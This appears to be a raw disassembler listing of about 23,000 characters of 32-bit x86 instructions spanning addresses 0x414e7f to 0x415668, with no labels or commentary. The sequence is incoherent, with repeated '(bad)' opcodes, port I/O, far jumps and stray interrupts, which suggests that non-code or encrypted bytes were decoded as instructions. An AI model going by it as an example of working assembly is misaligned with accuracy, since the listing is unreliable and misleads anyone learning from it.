  414e7f:	shl    bh,1
  414e81:	jns    0x414e71
  414e83:	mov    ah,0x4f
  414e85:	adc    eax,0x6411f6c9
  414e8a:	fcom   DWORD PTR ss:[esi-0x23]
  414e8e:	mov    ecx,0xafa873db
  414e93:	xor    eax,0xca37c49c
  414e98:	push   esp
  414e99:	mov    ch,BYTE PTR [ebp-0x58dc7737]
  414e9f:	mov    ebx,0x68e5ed32
  414ea4:	imul   edx,edx,0xc06e7d52
  414eaa:	mov    esi,esp
  414eac:	push   ecx
  414ead:	jo     0x414e60
  414eaf:	mov    edi,0x560560dc
  414eb4:	ja     0x414e3f
  414eb6:	in     eax,0xaf
  414eb8:	(bad)  
  414eb9:	push   0x12f93320
  414ebe:	adc    esi,esi
  414ec0:	sahf   
  414ec1:	cld    
  414ec2:	sub    BYTE PTR [ebx-0x72265937],dl
  414ec8:	pop    ds
  414ec9:	jmp    FWORD PTR [eax+0x7d50a376]
  414ecf:	mov    ebx,DWORD PTR [esi-0xba8bbf7]
  414ed5:	iret   
  414ed6:	jns    0x414f45
  414ed8:	sub    DWORD PTR [ecx],0x19b65c13
  414ede:	lock xchg ebx,eax
  414ee0:	mov    edx,0xf8d45e0b
  414ee5:	ret    
  414ee6:	mov    ecx,0x7be0590c
  414eeb:	and    eax,0x64bdacc5
  414ef0:	jmp    0xec19:0xfa4682e1
  414ef7:	xor    al,0x47
  414ef9:	rol    BYTE PTR [edx],1
  414efb:	pushf  
  414efc:	repz sub DWORD PTR [eax-0x9497536],edx
  414f03:	cmp    ecx,eax
  414f05:	push   ds
  414f06:	adc    al,0x1
  414f08:	stos   BYTE PTR es:[edi],al
  414f09:	xor    ah,BYTE PTR [edx-0x41]
  414f0c:	or     cl,BYTE PTR [ecx-0x7a]
  414f0f:	sbb    BYTE PTR [esi+0x54d7d074],0xe3
  414f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f17:	int    0x79
  414f19:	cmp    DWORD PTR [eax],esp
  414f1b:	leave  
  414f1c:	or     ax,0x187e
  414f20:	cs dec ebp
  414f22:	and    esi,DWORD PTR [esi-0x19]
  414f25:	adc    DWORD PTR [edi+ebp*2+0x17],ebx
  414f29:	fdivr  DWORD PTR [esi-0x15e7c395]
  414f2f:	pop    es
  414f30:	fild   QWORD PTR [ebp-0x7f]
  414f33:	xlat   BYTE PTR ds:[ebx]
  414f34:	fsub   QWORD PTR [esp+eax*8-0x1]
  414f38:	mov    BYTE PTR [ecx+0x1a7ecb54],bh
  414f3e:	scas   eax,DWORD PTR es:[edi]
  414f3f:	sub    eax,0xdefcdbf5
  414f44:	retf   0x96d9
  414f47:	enter  0x288c,0x5a
  414f4b:	ficomp WORD PTR [ecx-0x5f2feb0]
  414f51:	jmp    0x414f39
  414f53:	stos   BYTE PTR es:[edi],al
  414f54:	and    eax,0xf24a7a68
  414f59:	scas   eax,DWORD PTR es:[edi]
  414f5a:	dec    ecx
  414f5b:	in     al,0xf8
  414f5d:	test   eax,0xd957f228
  414f62:	int3   
  414f63:	pop    eax
  414f64:	xchg   DWORD PTR [ecx-0x647f263d],ebx
  414f6a:	push   eax
  414f6b:	pop    esp
  414f6c:	cwde   
  414f6d:	sbb    edi,0x32
  414f70:	push   ds
  414f71:	or     DWORD PTR [edi],esi
  414f73:	in     al,dx
  414f74:	pop    ds
  414f75:	cmc    
  414f76:	aad    0xda
  414f78:	sbb    DWORD PTR [bp+0x15],0xffffffa5
  414f7d:	sbb    al,0x95
  414f7f:	xchg   edx,eax
  414f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f81:	mov    DWORD PTR ds:0x43784ee4,esp
  414f87:	fisttp WORD PTR [edi]
  414f89:	adc    BYTE PTR [ecx-0x25],bl
  414f8c:	push   es
  414f8d:	inc    esi
  414f8e:	arpl   WORD PTR [esi+edi*2-0x6cd03808],sp
  414f95:	ret    0xb7db
  414f98:	retf   0xf1a9
  414f9b:	push   esi
  414f9c:	cs retf 0x703d
  414fa0:	lods   eax,DWORD PTR ds:[esi]
  414fa1:	or     ch,cl
  414fa3:	or     bl,BYTE PTR [edi]
  414fa5:	cli    
  414fa6:	gs inc ebp
  414fa8:	out    0x4b,eax
  414faa:	dec    ebx
  414fab:	mov    ch,0xaf
  414fad:	or     edi,DWORD PTR [eax+0x2b]
  414fb0:	add    al,BYTE PTR [edx+0x7e8508ec]
  414fb6:	xchg   esi,eax
  414fb7:	fmul   QWORD PTR [ebx+eiz*2-0x3f]
  414fbb:	jecxz  0x414f7d
  414fbd:	adc    eax,0x77eecb46
  414fc2:	stos   BYTE PTR es:[edi],al
  414fc3:	add    DWORD PTR [esi+0x97843e4],esi
  414fc9:	shr    DWORD PTR [ebx],0x74
  414fcc:	mov    bh,0x86
  414fce:	cdq    
  414fcf:	scas   eax,DWORD PTR es:[edi]
  414fd0:	mov    edx,0x8be1390d
  414fd5:	iret   
  414fd6:	sub    BYTE PTR [esp+ebx*2],0x46
  414fda:	jne    0x414fa4
  414fdc:	out    0x8d,eax
  414fde:	fwait
  414fdf:	out    dx,eax
  414fe0:	call   0xf9e80977
  414fe5:	adc    dh,BYTE PTR [edx-0x21]
  414fe8:	dec    edi
  414fe9:	scas   al,BYTE PTR es:[edi]
  414fea:	jae    0x414fee
  414fec:	mov    ebx,0xe86231cd
  414ff1:	adc    DWORD PTR [edi+ebp*2-0x5a],0xffffff99
  414ff6:	repz xchg ebx,eax
  414ff8:	rcl    BYTE PTR [edx+ecx*1+0x3d],cl
  414ffc:	and    esp,esp
  414ffe:	or     DWORD PTR [ecx],edx
  415000:	aam    0xf6
  415002:	push   ebp
  415003:	jae    0x415034
  415005:	lods   al,BYTE PTR ds:[esi]
  415006:	aad    0x8c
  415008:	push   0xffffffef
  41500a:	lods   al,BYTE PTR ds:[esi]
  41500b:	iret   
  41500c:	mov    bh,0x9c
  41500e:	fidivr WORD PTR [esi+0x16]
  415011:	aad    0xab
  415013:	cld    
  415014:	imul   edx,DWORD PTR [edx],0x3b6beb0b
  41501a:	stos   BYTE PTR es:[edi],al
  41501b:	mov    cl,0x98
  41501d:	xchg   ebx,eax
  41501e:	cs cld 
  415020:	and    edi,DWORD PTR [esi]
  415022:	sub    esi,eax
  415024:	jne    0x414ff6
  415026:	or     eax,0x6dd72176
  41502b:	stos   DWORD PTR es:[edi],eax
  41502c:	shl    DWORD PTR [ebp-0x23],1
  41502f:	icebp  
  415030:	push   ecx
  415031:	out    0x91,al
  415033:	arpl   WORD PTR [ebp-0xf77b06b],ax
  415039:	jne    0x415081
  41503b:	adc    DWORD PTR [edi+0x49],ebp
  41503e:	icebp  
  41503f:	iret   
  415040:	sub    BYTE PTR [eax+0x24213788],bl
  415046:	fwait
  415047:	or     edi,DWORD PTR [eax-0x1c]
  41504a:	aaa    
  41504b:	lea    edx,[ebx+esi*4-0x4c]
  41504f:	dec    edi
  415050:	ds jmp 0xd92a:0xa75471a
  415058:	jbe    0x41506d
  41505a:	sbb    al,0x42
  41505c:	es cwde 
  41505e:	retf   
  41505f:	ds cli 
  415061:	dec    edx
  415062:	ds pushw 0x27
  415066:	nop
  415067:	push   ecx
  415068:	jo     0x4150be
  41506a:	pop    ecx
  41506b:	in     al,0x77
  41506d:	popa   
  41506e:	in     al,dx
  41506f:	iret   
  415070:	icebp  
  415071:	call   0xa075:0x909577c1
  415078:	aas    
  415079:	lods   al,BYTE PTR ds:[esi]
  41507a:	test   al,0xe0
  41507c:	xchg   esi,eax
  41507d:	js     0x415054
  41507f:	out    0x2e,al
  415081:	sub    al,0x83
  415083:	daa    
  415084:	lods   al,BYTE PTR ds:[esi]
  415085:	pop    es
  415086:	adc    DWORD PTR [ebx+0xbea8cfc],ecx
  41508c:	push   edi
  41508d:	es adc DWORD PTR cs:[ebp-0x79],eax
  415092:	(bad)  
  415093:	cmp    eax,0xb20351e9
  415098:	dec    ebx
  415099:	sar    bh,cl
  41509b:	push   cs
  41509c:	(bad)  
  41509d:	shl    DWORD PTR [esi],1
  41509f:	and    eax,0xd0d9cea4
  4150a4:	and    dl,BYTE PTR [edi+0x3ce52249]
  4150aa:	inc    edi
  4150ab:	fist   DWORD PTR [ecx+ebp*4+0x6f1d9cd2]
  4150b2:	inc    edi
  4150b3:	push   0xffffffbb
  4150b5:	ret    0xd395
  4150b8:	rcl    ecx,1
  4150ba:	fimul  DWORD PTR [edx+0x30455624]
  4150c1:	ins    BYTE PTR es:[edi],dx
  4150c2:	xchg   ebp,eax
  4150c3:	dec    ebx
  4150c4:	(bad)  
  4150c5:	ja     0x4150d2
  4150c7:	adc    DWORD PTR [edx+edi*4-0x2b3f07f1],esi
  4150ce:	gs stc 
  4150d0:	adc    dh,BYTE PTR [ebp+0x38bcbf0e]
  4150d6:	pop    esp
  4150d7:	pop    esi
  4150d8:	adc    eax,0xb3be05ea
  4150dd:	xor    ch,ch
  4150df:	les    edx,FWORD PTR [edi-0xceafdf1]
  4150e5:	adc    ecx,edx
  4150e7:	jg     0x41511d
  4150e9:	out    0xb0,al
  4150eb:	mov    ebp,0x321b2729
  4150f0:	dec    ebp
  4150f1:	test   eax,0x1346efba
  4150f6:	test   eax,0xf3a722ad
  4150fb:	out    dx,al
  4150fc:	pop    ebp
  4150fd:	mov    edx,0xc8e0a69d
  415102:	pop    edi
  415103:	jg     0x4150a8
  415105:	and    al,0x39
  415107:	mov    esp,0x70bad62f
  41510c:	or     al,0x5c
  41510e:	adc    eax,0x550a3560
  415113:	mov    ecx,0x7b55d0fb
  415118:	jmp    0x4150ea
  41511a:	sub    ecx,esp
  41511c:	pop    esp
  41511d:	and    BYTE PTR [eax],al
  41511f:	leave  
  415120:	dec    eax
  415121:	and    cl,bl
  415123:	rol    DWORD PTR [esi-0x3b],0x1c
  415127:	push   ebp
  415128:	enter  0x8e95,0xe
  41512c:	mov    ch,0xa7
  41512e:	mov    ecx,0x7270fb81
  415133:	das    
  415134:	fimul  WORD PTR [edi-0x6eda591e]
  41513a:	pop    ebx
  41513b:	int    0x60
  41513d:	repnz fcomp DWORD PTR [edi-0x1515d956]
  415144:	lds    ecx,FWORD PTR [edx-0x5019d312]
  41514a:	jo     0x4150d1
  41514c:	rol    bh,0xa
  41514f:	icebp  
  415150:	pop    esp
  415151:	inc    ebx
  415153:	sbb    eax,0x759ca383
  415158:	pushf  
  415159:	mov    esi,0xa4937718
  41515e:	xchg   edx,eax
  41515f:	cmc    
  415160:	dec    eax
  415161:	add    BYTE PTR ds:0x483213db,bl
  415167:	pop    ebx
  415168:	add    DWORD PTR [ecx+edx*8],edi
  41516b:	popa   
  41516c:	or     bl,BYTE PTR [ecx]
  41516e:	outs   dx,BYTE PTR ds:[esi]
  41516f:	(bad)  
  415170:	sbb    eax,0xd4d20dc6
  415175:	mov    esi,0xe2a63ba3
  41517a:	push   edi
  41517b:	push   es
  41517c:	inc    ebx
  41517d:	cmp    al,BYTE PTR [ecx+0x54fbc8]
  415183:	cld    
  415184:	daa    
  415185:	fmul   st,st(5)
  415187:	cmp    eax,0x5eb15916
  41518c:	xchg   ecx,eax
  41518d:	call   0x1cf6b621
  415192:	dec    edi
  415193:	not    BYTE PTR [edi]
  415195:	add    cl,dl
  415197:	add    ecx,edi
  415199:	push   cs
  41519a:	clc    
  41519b:	add    DWORD PTR [eax-0x1d],0xffffffb0
  41519f:	jb     0x41521e
  4151a1:	dec    edi
  4151a2:	xchg   esi,eax
  4151a3:	push   ss
  4151a4:	outs   dx,BYTE PTR ds:[esi]
  4151a5:	push   edi
  4151a6:	jae    0x41517a
  4151a8:	adc    DWORD PTR [ebx-0x49],0x58
  4151ac:	pop    ds
  4151ad:	adc    edi,edx
  4151af:	push   ebp
  4151b0:	clc    
  4151b1:	mov    bh,0xff
  4151b3:	sub    eax,0xe9c18c1c
  4151b8:	dec    ecx
  4151b9:	add    al,0x43
  4151bb:	iret   
  4151bc:	out    dx,al
  4151bd:	adc    eax,DWORD PTR [edi-0x58]
  4151c0:	add    eax,0xea2ca448
  4151c5:	imul   esp,DWORD PTR [eax],0xffffffd1
  4151c8:	sub    al,0xf4
  4151ca:	add    ecx,DWORD PTR [edx]
  4151cc:	test   DWORD PTR [ecx+eax*2],ebp
  4151cf:	mov    ebx,0x844e3c52
  4151d4:	test   BYTE PTR [ebp+0x7eff98f7],bl
  4151da:	in     eax,0xb7
  4151dc:	loopne 0x41519b
  4151de:	cs sbb al,0x7f
  4151e1:	lods   al,BYTE PTR ds:[esi]
  4151e2:	mov    ch,0x19
  4151e4:	adc    ch,BYTE PTR [eax-0x7679fbb0]
  4151ea:	push   ecx
  4151eb:	aad    0x3d
  4151ed:	dec    ebx
  4151ee:	mov    eax,ds:0x20532825
  4151f3:	or     al,BYTE PTR ds:0xa03b308b
  4151f9:	or     ah,0xef
  4151fc:	jmp    0x2cb5cd91
  415201:	jle    0x4151a6
  415203:	lods   al,BYTE PTR ds:[esi]
  415204:	add    al,0x71
  415206:	(bad)  
  415207:	nop
  415208:	mov    BYTE PTR [ecx+eiz*8+0x0],dl
  41520c:	push   ecx
  41520d:	adc    al,0x6f
  41520f:	arpl   WORD PTR [ebx+0x61b343a8],dx
  415215:	aam    0xe2
  415217:	and    ah,ch
  415219:	xchg   edi,eax
  41521a:	inc    edi
  41521b:	das    
  41521c:	sahf   
  41521d:	pushf  
  41521e:	fs cmp al,0xad
  415221:	mov    bl,0xa9
  415223:	stc    
  415224:	loop   0x41529d
  415226:	pop    ds
  415227:	sbb    al,ch
  415229:	inc    edi
  41522a:	dec    edx
  41522b:	sbb    bh,BYTE PTR [ebx-0x30013f81]
  415231:	rcl    DWORD PTR [edi-0x56],cl
  415234:	or     bh,BYTE PTR [ebp+0x70]
  415237:	push   esi
  415238:	in     eax,dx
  415239:	mov    dl,0xe4
  41523b:	jae    0x415282
  41523d:	loopne 0x415269
  41523f:	out    dx,eax
  415240:	les    esp,FWORD PTR [ebx-0x62]
  415243:	test   BYTE PTR [ecx-0x44],0xe2
  415247:	ret    0xad68
  41524a:	jo     0x415264
  41524c:	outs   dx,DWORD PTR ds:[esi]
  41524d:	loope  0x415261
  41524f:	adc    ah,BYTE PTR [ecx+0x6a]
  415252:	cmp    al,0x74
  415254:	int3   
  415255:	inc    esp
  415256:	int3   
  415257:	mov    edi,cs
  415259:	mov    al,0xf9
  41525b:	leave  
  41525c:	(bad)  
  41525d:	or     ch,BYTE PTR [edx]
  41525f:	or     eax,0xc7fa5340
  415264:	inc    ecx
  415265:	inc    ebx
  415266:	xor    BYTE PTR [ecx],dh
  415268:	fsub   st,st(7)
  41526a:	bnd jae 0x41524c
  41526d:	aad    0x4b
  41526f:	sub    eax,0x84c49357
  415275:	cmp    eax,0xe9044c86
  41527a:	fisub  WORD PTR [ebp+0x26]
  41527d:	xor    al,BYTE PTR [esi+eax*4+0x6308ec99]
  415284:	rcr    DWORD PTR [esi-0x690b783e],0x26
  41528b:	ret    
  41528c:	loope  0x4152ed
  41528e:	aad    0x70
  415290:	dec    edx
  415291:	shr    ah,1
  415293:	sbb    al,0xe0
  415295:	xor    esp,DWORD PTR [edi]
  415297:	cmp    eax,0x343be470
  41529c:	or     cl,cl
  41529e:	mov    es,WORD PTR [ebx-0x3e]
  4152a1:	jl     0x4152d3
  4152a3:	out    dx,eax
  4152a4:	xchg   esp,eax
  4152a5:	mov    esp,0x1c49c374
  4152aa:	movups xmm0,XMMWORD PTR [esi-0x110f8603]
  4152b1:	cld    
  4152b2:	sbb    al,0xbf
  4152b4:	sbb    BYTE PTR [ebp-0x5f26f867],0x13
  4152bb:	sbb    BYTE PTR [ebx+0x33a07b39],0xe1
  4152c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152c3:	xchg   esp,eax
  4152c4:	fs push cs
  4152c6:	ss popa 
  4152c8:	mov    ah,0x5e
  4152ca:	lods   eax,DWORD PTR ds:[esi]
  4152cb:	aaa    
  4152cc:	mov    cl,0x3d
  4152ce:	or     eax,0x80287dd2
  4152d3:	xlat   BYTE PTR ds:[ebx]
  4152d4:	push   cs
  4152d5:	jbe    0x415264
  4152d7:	stos   DWORD PTR es:[edi],eax
  4152d8:	push   ss
  4152d9:	retf   0x4ee5
  4152dc:	sti    
  4152dd:	add    dl,BYTE PTR [ecx-0x43cbd7fb]
  4152e3:	sahf   
  4152e4:	test   al,0xdd
  4152e6:	stos   BYTE PTR es:[edi],al
  4152e7:	in     eax,0x49
  4152e9:	mov    al,0x34
  4152eb:	cmp    dh,bh
  4152ed:	(bad)  
  4152ee:	cdq    
  4152ef:	sar    BYTE PTR [edi],0x26
  4152f2:	jle    0x41532c
  4152f4:	inc    esp
  4152f5:	into   
  4152f6:	push   ss
  4152f7:	push   ds
  4152f8:	dec    ebx
  4152fa:	mov    WORD PTR ds:0x6ae08c82,ds
  415300:	push   ds
  415301:	push   esp
  415302:	ret    
  415303:	xchg   BYTE PTR [edi+esi*4+0xc9b8dd5],bl
  41530a:	jno    0x41538b
  41530c:	shr    DWORD PTR [edx],cl
  41530e:	jae    0x4152a8
  415310:	and    al,BYTE PTR [eax-0x1c]
  415313:	aas    
  415314:	imul   eax,DWORD PTR [eax-0x17c6b60e],0x28
  41531b:	test   al,0x48
  41531d:	fs loope 0x4152df
  415320:	js     0x41538c
  415322:	jno    0x4152c1
  415324:	xchg   dh,ch
  415326:	xor    al,bh
  415328:	mov    bl,0x13
  41532a:	daa    
  41532b:	stos   DWORD PTR es:[edi],eax
  41532c:	jp     0x41530f
  41532e:	ret    
  41532f:	mov    ebp,0x99509616
  415334:	mov    ah,0xd0
  415336:	test   ebx,0x1b9f9856
  41533c:	sub    edx,DWORD PTR [ebp-0x4fab0712]
  415342:	pop    esi
  415343:	sub    esi,DWORD PTR ds:0x43076b39
  415349:	rcr    BYTE PTR [esi],1
  41534b:	mov    ecx,0x3178f94d
  415350:	mov    DWORD PTR [ebx-0x7e],esi
  415353:	mov    ebp,esp
  415355:	mov    ebx,0xacdcc892
  41535a:	lock dec eax
  41535c:	jo     0x4153ad
  41535e:	data16 mov bl,0x1b
  415361:	xor    al,0xf9
  415363:	data16 lods al,BYTE PTR ss:[esi]
  415366:	add    al,BYTE PTR [ebx+0x6d579336]
  41536c:	mov    bl,0xe6
  41536e:	xchg   ebp,edx
  415370:	ins    DWORD PTR es:[edi],dx
  415371:	mov    ecx,0x38031849
  415376:	int3   
  415377:	inc    eax
  415378:	push   edx
  415379:	push   ss
  41537a:	add    cl,bh
  41537c:	jp     0x41533f
  41537e:	cmp    BYTE PTR [edx],ch
  415380:	test   al,0xa3
  415382:	jae    0x4153a4
  415384:	adc    al,0x2b
  415386:	fnstenv [edx+eax*1+0x5b7c2dda]
  41538d:	inc    ebx
  41538e:	scas   eax,DWORD PTR es:[edi]
  41538f:	shl    BYTE PTR [esi-0x1193ffef],1
  415395:	rcl    BYTE PTR [eax+0xcf2fab5],cl
  41539b:	xchg   esi,eax
  41539c:	pop    eax
  41539d:	mov    esp,0xcd21d860
  4153a2:	sbb    esi,esp
  4153a4:	jnp    0x4153b1
  4153a6:	dec    ecx
  4153a7:	xchg   DWORD PTR [edx],esp
  4153a9:	inc    eax
  4153aa:	push   0x4c
  4153ac:	lahf   
  4153ad:	inc    esi
  4153ae:	jle    0x4153de
  4153b0:	mov    bh,0xb2
  4153b2:	inc    edx
  4153b3:	xor    edx,ecx
  4153b5:	mov    ebp,DWORD PTR [edi+0x7a]
  4153b8:	inc    edi
  4153b9:	imul   edi,ebx,0x93166a2a
  4153bf:	call   0xa424256b
  4153c4:	mov    edi,0x857297e0
  4153c9:	pop    ebp
  4153ca:	pop    edi
  4153cb:	int3   
  4153cc:	sar    BYTE PTR [ebx-0x1ae15867],0xa
  4153d3:	jge    0x4153a1
  4153d5:	jg     0x4153bd
  4153d7:	or     BYTE PTR [edi],bh
  4153d9:	xchg   esp,eax
  4153da:	daa    
  4153db:	arpl   WORD PTR [esi],cx
  4153dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153de:	push   ebx
  4153df:	cmp    dh,al
  4153e1:	mov    esi,esp
  4153e3:	pop    eax
  4153e4:	out    0x72,eax
  4153e6:	arpl   WORD PTR [ebx-0x1b],di
  4153e9:	sub    al,0x90
  4153eb:	repnz or eax,0x2bb79e0
  4153f1:	cmp    ebx,DWORD PTR [edi+ebx*2-0x70]
  4153f5:	dec    edi
  4153f6:	jle    0x4153b3
  4153f8:	cwde   
  4153f9:	icebp  
  4153fa:	inc    esi
  4153fb:	mov    ah,0x76
  4153fd:	pop    ebx
  4153fe:	add    BYTE PTR [esi-0x4c],cl
  415401:	cmp    edi,DWORD PTR [edi+eiz*2+0x3d]
  415405:	(bad)  
  415406:	cs xor ch,ah
  415409:	cwde   
  41540a:	in     al,0x19
  41540c:	pop    edi
  41540d:	add    al,0x92
  41540f:	std    
  415410:	cmp    eax,DWORD PTR [esi-0x175f9056]
  415416:	xlat   BYTE PTR ds:[ebx]
  415417:	mov    ch,0xdd
  415419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41541a:	cli    
  41541b:	inc    BYTE PTR [ebp+0x72]
  41541e:	jae    0x415463
  415420:	(bad)  
  415421:	fidivr DWORD PTR [edx+0x39]
  415424:	test   DWORD PTR [ebx],ebx
  415426:	cmp    eax,0xfaba9a46
  41542b:	scas   al,BYTE PTR es:[edi]
  41542c:	sub    eax,0xe7ab376a
  415431:	pop    ebp
  415432:	mov    bh,0x73
  415434:	call   0x26ff:0x48191b97
  41543b:	inc    eax
  41543c:	mov    dh,0x28
  41543e:	shl    BYTE PTR [ebp+0x30a9f474],0xf9
  415445:	xchg   BYTE PTR [edi],bl
  415447:	sub    BYTE PTR [ebx-0x47],cl
  41544a:	jp     0x415452
  41544c:	mov    ds:0x3018d8e2,eax
  415451:	and    esi,DWORD PTR [ecx-0x1]
  415454:	sbb    eax,0x9bca26e2
  415459:	mov    ?,WORD PTR ds:0x69789be8
  41545f:	shl    dh,1
  415461:	sub    BYTE PTR [ebx-0x1703e119],0x8
  415468:	ror    edx,1
  41546a:	outs   dx,BYTE PTR ds:[esi]
  41546b:	dec    edx
  41546c:	mov    eax,0xf147476e
  415471:	aaa    
  415472:	(bad)  
  415473:	fiadd  WORD PTR [esi+edi*2-0x6b]
  415477:	mov    ebp,0xe7107f1c
  41547c:	mov    dh,0x55
  41547e:	stc    
  41547f:	xor    al,0x97
  415481:	add    BYTE PTR [edi-0x1a],dl
  415484:	mov    edi,0x70f544a9
  415489:	adc    dh,bl
  41548b:	and    eax,0x99b90c37
  415490:	aas    
  415491:	ret    
  415492:	adc    DWORD PTR [esi-0x74],0x22
  415496:	cmp    eax,0x1bfb3591
  41549b:	stos   DWORD PTR es:[edi],eax
  41549c:	sub    cl,al
  41549e:	ficom  DWORD PTR [esi-0x56]
  4154a1:	and    DWORD PTR [eax+0x2c978d73],ebx
  4154a7:	dec    ebp
  4154a8:	daa    
  4154a9:	test   al,0x5e
  4154ab:	xchg   edi,eax
  4154ac:	loop   0x4154f8
  4154ae:	pcmpgtb mm0,QWORD PTR [edx-0x50]
  4154b2:	xchg   edx,eax
  4154b3:	cdq    
  4154b4:	inc    ecx
  4154b5:	je     0x41543c
  4154b7:	gs push ecx
  4154b9:	add    dl,al
  4154bb:	adc    dl,ch
  4154bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154be:	mov    ?,WORD PTR [edx]
  4154c0:	jae    0x4154f8
  4154c2:	jle    0x41553c
  4154c4:	and    bl,BYTE PTR [edi-0x33]
  4154c7:	bound  eax,QWORD PTR [ebp-0x52]
  4154ca:	es mov ch,0x80
  4154cd:	dec    eax
  4154ce:	mov    al,0xb3
  4154d0:	inc    esp
  4154d1:	cmc    
  4154d2:	adc    edx,DWORD PTR [ebx-0x1]
  4154d5:	adc    al,0xe7
  4154d7:	ins    DWORD PTR es:[edi],dx
  4154d8:	pusha  
  4154d9:	into   
  4154da:	test   BYTE PTR [esi+0x27],ah
  4154dd:	cli    
  4154de:	inc    BYTE PTR [ebx]
  4154e0:	cmp    al,0x79
  4154e3:	out    0x22,al
  4154e5:	xlat   BYTE PTR ds:[ebx]
  4154e6:	add    dl,BYTE PTR [ebp+0x7bc397c5]
  4154ec:	jp     0x4154e0
  4154ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ef:	addr16 cld 
  4154f1:	(bad)  
  4154f2:	frstor [edi-0x3beaf499]
  4154f8:	in     al,dx
  4154f9:	pop    ecx
  4154fa:	xchg   edi,eax
  4154fb:	pop    esp
  4154fc:	je     0x4154ee
  4154fe:	mov    esp,edx
  415500:	adc    ebp,esp
  415502:	test   eax,0xd348ccc
  415507:	push   esp
  415508:	or     dh,BYTE PTR [edi-0x7e6ef8f]
  41550e:	jmp    0x3237b3a2
  415513:	shl    DWORD PTR [eax+0x330520bb],0xc9
  41551a:	inc    ebx
  41551b:	out    dx,eax
  41551c:	adc    ah,BYTE PTR [ebx-0x5477ba7c]
  415522:	std    
  415523:	les    ebx,FWORD PTR [ecx+ebp*1-0x73]
  415527:	pop    ecx
  415528:	sbb    cl,ah
  41552a:	stos   BYTE PTR es:[edi],al
  41552b:	out    dx,al
  41552c:	lds    ebx,FWORD PTR [edi]
  41552e:	cmp    ah,ah
  415530:	adc    BYTE PTR [edi-0x1b],cl
  415533:	cmp    bh,BYTE PTR [edi+0x4d]
  415536:	jns    0x415534
  415538:	cmp    ecx,ebx
  41553a:	sub    BYTE PTR [ebx],cl
  41553c:	cmp    eax,0xd2dace29
  415541:	jle    0x415587
  415543:	jl     0x4155a9
  415545:	loop   0x415522
  415547:	add    dl,0x61
  41554a:	inc    edx
  41554b:	dec    edx
  41554c:	sti    
  41554d:	ins    BYTE PTR es:[edi],dx
  41554e:	retf   0xeca3
  415551:	sti    
  415552:	push   ebx
  415553:	mov    dl,BYTE PTR [ebp+esi*1+0x703b324b]
  41555a:	setle  BYTE PTR [edi+0x5f7074ab]
  415561:	dec    edi
  415562:	mov    ds:0xa8f42dfd,eax
  415567:	jb     0x415544
  415569:	adc    al,0x8e
  41556b:	dec    esp
  41556c:	and    al,0x67
  41556e:	xchg   ecx,eax
  41556f:	jle    0x4155e2
  415571:	das    
  415572:	mov    ebx,0xfa283b7c
  415577:	pop    edx
  415578:	repz and al,0xdd
  41557b:	jge    0x4155dd
  41557d:	sbb    eax,0x544015dc
  415582:	out    0x5e,al
  415584:	pop    eax
  415585:	jb     0x415600
  415587:	xlat   BYTE PTR ds:[ebx]
  415588:	inc    edx
  415589:	pop    es
  41558a:	iret   
  41558b:	out    0xfd,al
  41558d:	loopne 0x41560a
  41558f:	dec    esi
  415590:	es imul ebx,ebp,0xe0e58b6f
  415597:	call   0xf2efb77e
  41559c:	mov    cl,0x40
  41559e:	mov    gs,WORD PTR [eax+0x5f39cd6c]
  4155a4:	repnz add bh,BYTE PTR [eax+eiz*1+0x6]
  4155a9:	lahf   
  4155aa:	add    al,0x10
  4155ac:	pop    ebx
  4155ad:	mov    al,0xa6
  4155af:	bound  ecx,QWORD PTR [ecx]
  4155b1:	mov    bh,0x6a
  4155b3:	cmp    WORD PTR [edi+0x152dcb7],dx
  4155ba:	add    cl,BYTE PTR [esi]
  4155bc:	imul   ebp,DWORD PTR [esi-0x214b333],0x45ca4470
  4155c6:	push   edx
  4155c7:	orps   xmm0,XMMWORD PTR [edi+ebx*8+0x29]
  4155cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155cd:	dec    esi
  4155ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155cf:	or     eax,0xb6c77484
  4155d4:	ror    DWORD PTR [eax+0x287cb57a],1
  4155da:	int    0xb8
  4155dc:	not    BYTE PTR [ebp+0x3d]
  4155df:	je     0x415622
  4155e1:	in     al,dx
  4155e2:	push   edi
  4155e3:	shl    DWORD PTR [edx],1
  4155e5:	inc    ecx
  4155e6:	sbb    edx,DWORD PTR [ebx-0x56]
  4155e9:	ret    0x349f
  4155ec:	xchg   edi,eax
  4155ed:	push   eax
  4155ee:	push   ss
  4155ef:	or     DWORD PTR [esi],esp
  4155f1:	int3   
  4155f2:	jg     0x41562d
  4155f4:	test   al,0xae
  4155f6:	sub    al,0xcc
  4155f8:	mov    dh,0x5e
  4155fa:	dec    esi
  4155fb:	add    DWORD PTR ss:[eax],0x50adaeb2
  415602:	jo     0x4155bd
  415604:	mov    bl,0x7c
  415606:	or     edx,esp
  415608:	and    al,BYTE PTR [edx+0x21]
  41560b:	xor    eax,0xc9a73255
  415610:	popa   
  415611:	ins    BYTE PTR es:[edi],dx
  415612:	sbb    edi,DWORD PTR [edx-0x20]
  415615:	push   0xb750f2db
  41561a:	out    0xd4,al
  41561c:	sub    eax,0x9a604104
  415621:	mov    ds:0xb74aa63b,eax
  415626:	test   BYTE PTR [ebx-0x5b],bh
  415629:	enter  0x34c,0x92
  41562d:	int3   
  41562e:	xchg   esi,eax
  41562f:	push   ss
  415630:	jl     0x415650
  415632:	or     al,0xc6
  415634:	sbb    DWORD PTR [ebp+0x20962a26],esp
  41563a:	mov    al,0x9
  41563c:	mov    bl,0x82
  41563e:	xchg   esp,eax
  41563f:	sahf   
  415640:	shl    DWORD PTR ds:0x51f8f298,0xcb
  415647:	retf   0x6d85
  41564a:	loopne 0x4156bd
  41564c:	clc    
  41564d:	add    DWORD PTR [edi+edx*1+0x3f],esi
  415651:	arpl   WORD PTR [ecx+0x2d],dx
  415654:	inc    ebp
  415655:	pop    edx
  415656:	pop    ebx
  415657:	out    0xaa,al
  415659:	nop
  41565a:	and    eax,0xdde53a76
  41565f:	push   edx
  415660:	out    dx,al
  415661:	repz add eax,0x9e89d4b4
  415667:	dec    edx
  415668:	cmp    eax,0xd0fd78a9
